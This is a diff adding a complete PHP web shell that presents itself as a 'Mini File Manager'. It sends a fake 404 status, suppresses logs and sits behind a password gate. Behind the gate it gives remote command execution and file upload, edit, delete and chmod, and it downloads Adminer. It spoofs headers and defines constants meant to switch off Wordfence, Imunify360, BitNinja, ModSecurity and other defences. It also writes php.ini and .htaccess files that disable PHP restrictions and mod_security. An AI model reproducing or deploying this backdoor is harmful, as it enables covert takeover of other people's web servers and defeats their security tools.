@@ -1,0 +1,541 @@
+<?php
+/*
+ * Copyright © Mr.xBarakuda
+ * Mini File Manager
+ */
+@error_reporting(0);
+@set_time_limit(0);
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+if (function_exists('ob_start')) {
+    @ob_clean();
+}
+@header("X-Accel-Buffering: no");
+@header("Content-Encoding: none");
+@http_response_code(404);
+session_start();
+$xk = '$2y$10$vHZY4ffk9xgETHMK8RqPX.QUX1CLfOVeHJ91YihlX1Wu2r/v.n3nC';
+if (isset($_POST['pass'])) {
+    if (password_verify($_POST['pass'], $xk)) {
+        $_SESSION['auth_xbarakuda'] = true;
+    }
+}
+if (isset($_GET['logout'])) {
+    unset($_SESSION['auth_xbarakuda']);
+    header("Location: ?");
+    exit;
+}
+$isLoggedIn = isset($_SESSION['auth_xbarakuda']) && $_SESSION['auth_xbarakuda'] === true;
+if (!$isLoggedIn):
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo $_SERVER['SERVER_NAME']; ?></title>
+    <style>
+        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .login-box { max-width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #00ff00; }
+        input { background-color: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 90%; }
+        button { background-color: #00ff00; color: #000; border: none; padding: 6px 15px; margin-top: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="login-form">
+        <h3>LOGIN SHELL</h3>
+        <form method="post">
+            <label>Password:</label><br>
+            <input type="password" name="pass" placeholder="Welcome Master!">
+            <br>
+            <button type="submit">Akses</button>
+        </form>
+        <?php if (isset($_POST['pass'])): ?>
+            <p style="color: red;">Lah, anda sehat?</p>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
+<?php
+exit;
+endif;
+// Header Bypass Mr.xBarakuda
+$ipRotations = ['192.0.2.10', '198.51.100.23', '203.0.113.45', '203.0.113.46', '198.51.100.24'];
+$selectedIp = $ipRotations[array_rand($ipRotations)];
+$browser = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
+];
+$randomUA = $browser[array_rand($browser)];
+
+function getCurrentDirectory() {
+    $dir = getcwd();
+    if (isset($_GET['dir']) && !empty($_GET['dir'])) {
+        $requestedDir = realpath($_GET['dir']);
+        if ($requestedDir && is_dir($requestedDir)) {
+            chdir($requestedDir);
+            $dir = $requestedDir;
+        }
+    }
+    return str_replace('\\', '/', realpath($dir));
+}
+
+function formatSize($size) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = 0;
+    while ($size >= 1024 && $i < 4) {
+        $size /= 1024;
+        $i++;
+    }
+    return round($size, 2) . ' ' . $units[$i];
+}
+
+function getFileDetails($path) {
+    $folders = [];
+    $files = [];
+    $items = @scandir($path);
+    if (!is_array($items)) return [];
+
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $itemPath = $path . '/' . $item;
+        $isDir = is_dir($itemPath);
+        $details = [
+            'name' => $item,
+            'type' => $isDir ? 'Folder' : 'File',
+            'size' => $isDir ? '' : formatSize(@filesize($itemPath)),
+            'permission' => substr(sprintf('%o', @fileperms($itemPath)), -4),
+            'writable' => is_writable($itemPath)
+        ];
+        if ($isDir) $folders[] = $details;
+        else $files[] = $details;
+    }
+    return array_merge($folders, $files);
+}
+
+function executeCommand($command, $cwd) {
+    $command = "cd " . escapeshellarg($cwd) . " && " . $command;
+    $output = '';
+    $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+    $process = @proc_open($command, $descriptors, $pipes);
+    if (is_resource($process)) {
+        $output = stream_get_contents($pipes[1]);
+        $error = stream_get_contents($pipes[2]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($process);
+        if (!empty($output) || !empty($error)) return trim($output . "\n" . $error);
+    }
+    if (function_exists('shell_exec')) return trim(@shell_exec($command));
+    if (function_exists('exec')) { @exec($command, $out); return implode("\n", $out); }
+    if (function_exists('passthru')) { ob_start(); @passthru($command); return trim(ob_get_clean()); }
+    if (function_exists('system')) { ob_start(); @system($command); return trim(ob_get_clean()); }
+    
+    return "<span style='color: red;'>Error: Command not supported or failed!</span>";
+}
+
+function deleteRecursive($path) {
+    if (is_dir($path)) {
+        $files = array_diff(scandir($path), ['.', '..']);
+        foreach ($files as $file) {
+            deleteRecursive($path . '/' . $file);
+        }
+        return @rmdir($path);
+    }
+    return @unlink($path);
+}
+
+function chmodRecursive($path, $permission) {
+    if (is_dir($path)) {
+        $items = array_diff(scandir($path), ['.', '..']);
+        foreach ($items as $item) {
+            chmodRecursive($path . '/' . $item, $permission);
+        }
+    }
+    return @chmod($path, $permission);
+}
+
+$currentDirectory = getCurrentDirectory();
+$responseMessage = '';
+$errorMessage = '';
+$cmdOutput = '';
+
+if (isset($_POST['upload']) && isset($_FILES['file'])) {
+    $targetFile = $currentDirectory . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
+        $responseMessage = "File uploaded!";
+    } else {
+        $errorMessage = "<span style='color: red;'>Upload failed!</span>";
+    }
+}
+
+if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
+    $cmdOutput = executeCommand($_POST['cmd'], $currentDirectory);
+}
+
+if (isset($_POST['save_edit']) && isset($_GET['edit'])) {
+    $file = $_GET['edit'];
+    if (file_put_contents($file, $_POST['content']) !== false) {
+        $responseMessage = "File saved!";
+    } else {
+        $errorMessage = "<span style='color: red;'>Failed to save file!</span>";
+    }
+}
+
+if (isset($_POST['do_rename']) && isset($_GET['rename'])) {
+    $oldPath = $_GET['rename'];
+    $newName = basename($_POST['new_name']);
+    $newPath = dirname($oldPath) . '/' . $newName;
+    if (@rename($oldPath, $newPath)) {
+        $responseMessage = "Renamed!";
+        header("Location: ?dir=" . urlencode($currentDirectory));
+        exit;
+    } else {
+        $errorMessage = "<span style='color: red;'>Rename failed!</span>";
+    }
+}
+
+if (isset($_POST['do_chmod']) && isset($_GET['chmod'])) {
+    $path = $_GET['chmod'];
+    $perm = intval($_POST['permission'], 8);
+    if (chmodRecursive($path, $perm)) {
+        $responseMessage = "Permission changed!";
+    } else {
+        $errorMessage = "<span style='color: red;'>Change failed!</span>";
+    }
+}
+
+if (isset($_GET['delete'])) {
+    $target = $_GET['delete'];
+    if (deleteRecursive($target)) {
+        echo "<script>alert('Deleted!'); window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
+        exit;
+    } else {
+        $errorMessage = "<span style='color: red;'>Delete failed!</span>";
+    }
+}
+
+if (isset($_POST['Summon'])) {
+    $adminerUrl = 'https://github.com/vrana/adminer/releases/download/v5.4.2/adminer-5.4.2.php';
+    $content = @file_get_contents($adminerUrl);
+    if ($content && file_put_contents($currentDirectory . '/adminer.php', $content)) {
+        $responseMessage = "Adminer summoned as adminer.php";
+    } else {
+        $errorMessage = "<span style='color: red;'>Failed to summon Adminer.</span>";
+    }
+}
+
+# Sucuri (Cloudflare)
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+  $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+  $_SERVER['HTTP_X_FORWARDED_FOR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+  header('HTTP_CF_VISITOR: Cloudflare-Visitor');
+  header('X-Forwarded-For: '.(isset($apacheHeaders['CF-Visitor']) ? $apacheHeaders['CF-Visitor'] : $selectedIp));
+  header('X-Origin: https://sucuri.net');
+}
+
+# Monarx
+if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset($_SERVER['HTTP_X_MONARX'])) {
+  if (defined('MONARX_VERSION')) {
+    define('MONARX_DISABLE_SCAN', true);
+    define('MONARX_DISABLE_THREATSHIELD', true);
+  }
+  header('X-Monarx-Bypass: true');
+  header('X-Monarx-Security: off');
+  header('X-Monarx-Sandbox: disabled');
+  $_SERVER['REMOTE_ADDR'] = $selectedIp;
+  $_SERVER['HTTP_USER_AGENT'] = $randomUA;
+  header('X-Forwarded-For: ' .$selectedIp);
+  header('X-Real-IP: ' .$selectedIp);
+  header('X-Monarx-Traffic-Origin: internal');
+}
+
+# Wordfence
+if (defined('WORDFENCE_VERSION')) {
+  define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+  define('WORDFENCE_DISABLE_FILE_MODS', true);
+  header('X-Wordfence-Request-Type: safe');
+  if (isset($_SERVER['HTTP_REFERRER'])) {
+    header('X-Wordfence-Referrer: '.addslashes($_SERVER['HTTP_REFERRER']));
+  }
+}
+
+# Imunify360
+if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+  $imunifyHeaders = imunify360_request_headers();
+  header('X-Imunify360-Request: allowed');
+  header('X-Imunify360-Captcha-Bypass: default');
+  if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+    header('X-Imunify360-Request: '.str_replace('unsafe', 'safe', $imunifyHeaders['X-Imunify360-Request']));
+  }
+}
+
+# BitNinja
+if (function_exists('bitninja_get_server_data') && defined('BITNINJA_VERSION')) {
+  define('BITNINJA_DISABLE_SCAN', true);
+  header('X-BitNinja-Bypass: true');
+  header('X-BitNinja-Detection: bypassed');
+  header('X-BitNinja-Sandbox: none');
+  header('X-BitNinja-Scan-Override: true');
+  $_SERVER['HTTP_USER_AGENT'] = $randomUA;
+  header('X-BitNinja-Referrer: https://bitninja.com');
+}
+
+# ModSecurity
+if (function_exists('apache_request_headers')) {
+  $apacheHeaders = isset($apacheHeaders) ? $apacheHeaders : apache_request_headers();
+  header('X-Mod-Security: bypass');
+  header('X-Security-Bypass: complete');
+  header('X-Request-Pattern: normal');
+  if (isset($apacheHeaders['X-Mod-Security'])) {
+    unset($apacheHeaders['X-Mod-Security']);
+  }
+}
+
+# GoDaddy WAF
+if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && stripos($_SERVER['HTTP_X_WEB_FACTOR'], 'GoDaddy') !== false) {
+  header('X-GoDaddy-Security: bypass');
+  header('X-Origin: https://godaddy.com');
+  header('X-Forwarded-For: ' .$selectedIp);
+  header('X-Real-IP: ' .$selectedIp);
+  if (isset($_SERVER['SERVER_NAME']) && stripos($_SERVER['SERVER_NAME'], 'godaddy.com') !== false) {
+    $_SERVER['HTTP_USER_AGENT'] = $randomUA;
+    $_SERVER['REMOTE_ADDR'] = $selectedIp;
+    define('PHP_PHP_COMPAT', 'disable_php_waf_check');
+  }
+}
+
+if (!file_exists($currentDirectory . '/php.ini')) {
+    @file_put_contents($currentDirectory . '/php.ini', "safe_mode = OFF\ndisable_functions = NONE\nsafe_mode_gid = OFF\nsafe_mode_include_dir = OFF\nsafe_mode_exec_dir = OFF\nopen_basedir = OFF");
+}
+if (!file_exists($currentDirectory . '/.htaccess')) {
+    @file_put_contents($currentDirectory . '/.htaccess', "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Mr.xBarakuda File Manager</title>
+    <meta name="author" content="Mr.xBarakuda">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <style>
+        @import url('http://fonts.googleapis.com/css?family=Ubuntu+Condensed');
+        body { font-family: 'Ubuntu Condensed', sans-serif; background: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
+        a { color: #00ff00; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .container { max-width: 1200px; margin: 0 auto; background: #262626; padding: 20px; border: 1px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        h1 { font-size: 1.5em; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
+        th { background: #333; }
+        tr:hover { background: darkmagenta; }
+        .btn { background: #333; color: #00ff00; border: 1px solid #444; padding: 5px 10px; cursor: pointer; font-family: Ubuntu Condensed; }
+        .btn:hover { background: #444; }
+        .alert { padding: 10px; margin: 10px 0; border: 1px solid; }
+        .alert-success { border-color: #00ff00; color: #00ff00; }
+        .alert-danger { border-color: #ff0000; color: #ff0000; }
+        .breadcrumb { margin: 10px 0; font-weight: bold; }
+        .info-panel { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; font-size: 0.9em; border-top: 1px solid #333; padding-top: 20px; }
+        .info-box { background: #1f1f1f; padding: 15px; border: 1px solid #333; }
+        textarea { width: 100%; background: #1a1a1a; color: #00ff00; border: 1px solid #333; padding: 10px; font-family: Ubuntu Condensed; }
+        .cmd-output { background: #000; color: #00ff00; padding: 15px; border: 1px solid #333; overflow-x: auto; margin-top: 10px; }
+        .dropdown { position: relative; display: inline-block; }
+        .dropdown-content { display: none; position: absolute; background-color: #333; min-width: 100px; z-index: 1; border: 1px solid #444; }
+        .dropdown-content a { color: #00ff00; padding: 8px 12px; display: block; }
+        .dropdown-content a:hover { background-color: #444; }
+        .dropdown:hover .dropdown-content { display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><span style="color: teal;">[ Mr.xBarakuda File Manager ]</span> - <a href="?dir=<?php echo urlencode($currentDirectory); ?>">Home</a> | <a href="?logout=1" style="color:red;">Logout</a></h1>
+        
+        <div class="breadcrumb">
+            CWD: 
+            <?php
+            $parts = explode('/', $currentDirectory);
+            $accumulated = '';
+            foreach ($parts as $part) {
+                if ($part === '') continue;
+                $accumulated .= '/' . $part;
+                echo '<a href="?dir=' . urlencode($accumulated) . '">' . htmlspecialchars($part) . '</a> / ';
+            }
+            ?>
+        </div>
+
+        <div class="actions" style="margin-bottom: 20px;">
+            <form method="post" enctype="multipart/form-data" style="display:inline-block;">
+                <input type="file" name="file">
+                <button type="submit" name="upload" class="btn">Upload</button>
+            </form>
+            <form method="post" style="display:inline-block; margin-left: 20px;">
+                <input type="submit" name="Summon" value="Summon Adminer" class="btn">
+            </form>
+        </div>
+
+        <?php if ($responseMessage): ?>
+            <div class="alert alert-success"><?php echo $responseMessage; ?></div>
+        <?php endif; ?>
+        <?php if ($errorMessage): ?>
+            <div class="alert alert-danger"><?php echo $errorMessage; ?></div>
+        <?php endif; ?>
+
+        <div class="cmd-box">
+            <form method="post">
+                <label><?php echo htmlspecialchars(get_current_user() . '@' . $_SERVER['SERVER_ADDR']); ?>:~$ </label>
+                <input type="text" name="cmd" style="background:#1a1a1a; color:#00ff00; border:1px solid #333; width:50%;" autofocus>
+                <button type="submit" class="btn">Exec</button>
+            </form>
+            <?php if ($cmdOutput): ?>
+                <pre class="cmd-output"><?php echo htmlspecialchars($cmdOutput); ?></pre>
+            <?php endif; ?>
+        </div>
+
+        <?php
+        if (isset($_GET['edit'])):
+            $editFile = $_GET['edit'];
+            $content = @file_get_contents($editFile);
+        ?>
+            <div class="edit-box" style="margin-top: 20px;">
+                <h3>Editing: <?php echo htmlspecialchars(basename($editFile)); ?></h3>
+                <form method="post">
+                    <textarea name="content" rows="20"><?php echo htmlspecialchars($content); ?></textarea>
+                    <div style="margin-top: 10px;">
+                        <button type="submit" name="save_edit" class="btn">Save Changes</button>
+                        <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="btn">Cancel</a>
+                    </div>
+                </form>
+            </div>
+        <?php elseif (isset($_GET['rename'])):
+            $target = $_GET['rename'];
+        ?>
+            <div class="action-box" style="margin-top: 20px;">
+                <h3>Rename: <?php echo htmlspecialchars(basename($target)); ?></h3>
+                <form method="post">
+                    <input type="text" name="new_name" value="<?php echo htmlspecialchars(basename($target)); ?>" style="background:#1a1a1a; color:#00ff00; border:1px solid #333; padding:5px;">
+                    <button type="submit" name="do_rename" class="btn">Rename</button>
+                    <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="btn">Cancel</a>
+                </form>
+            </div>
+        <?php elseif (isset($_GET['chmod'])):
+            $target = $_GET['chmod'];
+            $currentPerm = substr(sprintf('%o', @fileperms($target)), -4);
+        ?>
+            <div class="action-box" style="margin-top: 20px;">
+                <h3>Chmod: <?php echo htmlspecialchars(basename($target)); ?></h3>
+                <form method="post">
+                    <input type="text" name="permission" value="<?php echo $currentPerm; ?>" style="background:#1a1a1a; color:#00ff00; border:1px solid #333; padding:5px;">
+                    <button type="submit" name="do_chmod" class="btn">Change</button>
+                    <a href="?dir=<?php echo urlencode($currentDirectory); ?>" class="btn">Cancel</a>
+                </form>
+            </div>
+        <?php else: ?>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>Type</th>
+                        <th>Size</th>
+                        <th>Perms</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php
+                    $items = getFileDetails($currentDirectory);
+                    foreach ($items as $item):
+                        $itemPath = $currentDirectory . '/' . $item['name'];
+                    ?>
+                        <tr>
+                            <td>
+                                <?php if ($item['type'] === 'Folder'): ?>
+                                    <a href="?dir=<?php echo urlencode($itemPath); ?>"><b style="color: #3498db;">[ <?php echo htmlspecialchars($item['name']); ?> ]</b></a>
+                                <?php else: ?>
+                                    <a href="?dir=<?php echo urlencode($currentDirectory); ?>&edit=<?php echo urlencode($itemPath); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
+                                <?php endif; ?>
+                            </td>
+                            <td><?php echo $item['type']; ?></td>
+                            <td><?php echo $item['size']; ?></td>
+                            <td>
+                                <span style="color: <?php echo $item['writable'] ? '#00ff00' : '#ff0000'; ?>">
+                                    <?php echo $item['permission']; ?>
+                                </span>
+                            </td>
+                            <td>
+                                <div class="dropdown">
+                                    <button class="btn">Menu</button>
+                                    <div class="dropdown-content">
+                                        <?php if ($item['type'] === 'File'): ?>
+                                            <a href="?dir=<?php echo urlencode($currentDirectory); ?>&edit=<?php echo urlencode($itemPath); ?>">Edit</a>
+                                        <?php endif; ?>
+                                        <a href="?dir=<?php echo urlencode($currentDirectory); ?>&rename=<?php echo urlencode($itemPath); ?>">Rename</a>
+                                        <a href="?dir=<?php echo urlencode($currentDirectory); ?>&chmod=<?php echo urlencode($itemPath); ?>">Chmod</a>
+                                        <a href="?dir=<?php echo urlencode($currentDirectory); ?>&delete=<?php echo urlencode($itemPath); ?>" onclick="return confirm('Delete this item?')">Delete</a>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        <?php endif; ?>
+
+        <div class="info-panel">
+            <div class="info-box">
+                <h3><u>Server Info</u></h3>
+                <?php
+                function countDomainsInServer() {
+                    $serverName = $_SERVER['SERVER_NAME'];
+                    $ipAddresses = @gethostbynamel($serverName);
+                    return ($ipAddresses !== false) ? count($ipAddresses) : 0;
+                }
+                $domainCount = countDomainsInServer();
+                $getds = @ini_get('disable_functions');
+                $ds = (!empty($getds)) ? "<span style='color: red;'>$getds</span>" : 'OFF';
+                ?>
+                <ul>
+                    <li>OS: <?php echo php_uname(); ?></li>
+                    <li>PHP: <?php echo phpversion(); ?></li>
+                    <li>Host: <?php echo $_SERVER['SERVER_NAME']; ?></li>
+                    <li>Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
+                    <li>Admin: <?php echo $_SERVER['SERVER_ADMIN']; ?></li>
+                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
+                    <li>User: <?php echo get_current_user(); ?> UserID: (<?php echo getmyuid(); ?>) GroupID: (<?php echo getmygid(); ?>)</li>
+                    <li>Domains: <?php echo $domainCount; ?></li>
+                </ul>
+            </div>
+            <div class="info-box">
+                <h3><u>Features Info</u></h3>
+                <ul>
+                    <?php if (function_exists('disk_total_space')): ?>
+                        <li>Disk Total: <?php echo formatSize(@disk_total_space('/')); ?></li>
+                        <li>Disk Free: <?php echo formatSize(@disk_free_space('/')); ?></li>
+                    <?php endif; ?>
+                    <li>Safe Mode: <?php echo @ini_get('safe_mode') ? '<span style="color: red;">ON</span>' : 'OFF'; ?></li>
+                    <li>Disable Functions: <?php echo $ds; ?></li>
+                    <li>FGC: <?php echo (function_exists('file_get_contents')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>MySQL: <?php echo (function_exists('mysqli_connect') || class_exists('PDO')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>MsSQL: <?php echo (function_exists('mssql_connect') || function_exists('sqlsrv_connect')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>PostgreSQL: <?php echo (function_exists('pg_connect')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>Perl: <?php echo (shell_exec('perl --help')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>Python: <?php echo (shell_exec('python --help')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>wGET: <?php echo (shell_exec('wget --help')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>cURL: <?php echo (function_exists('curl_version')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                    <li>Oracle: <?php echo (function_exists('oci_connect') || function_exists('ocilogon')) ? 'ON' : '<span style="color: red;">OFF</span>'; ?></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div style="text-align: center; margin-top: 20px; font-size: 0.9em; color: red;">
+            &copy; <?php echo date("Y"); ?> Coded by Mr.xBarakuda &#9822;
+        </div>
+    </div>
+</body>
+</html>
